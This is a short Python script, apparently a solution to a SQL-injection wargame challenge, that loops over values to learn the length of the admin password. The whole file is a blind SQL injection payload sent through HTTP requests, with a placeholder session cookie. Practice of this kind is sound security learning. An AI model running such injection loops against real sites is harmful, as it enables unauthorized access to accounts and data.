import requests
url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
cookie = {'PHPSESSID' : 개인쿠키값}

for i in range(1, 30):
    req_url = url + f"?pw= ' or id='admin' and length(pw)={i}%23"
    res = requests.get(req_url, cookies=cookie)
    if "<h2>Hello admin</h2>" in res.text:
        print(f"{i} -> O")
        break
    else:
        print(f"{i} ---> X")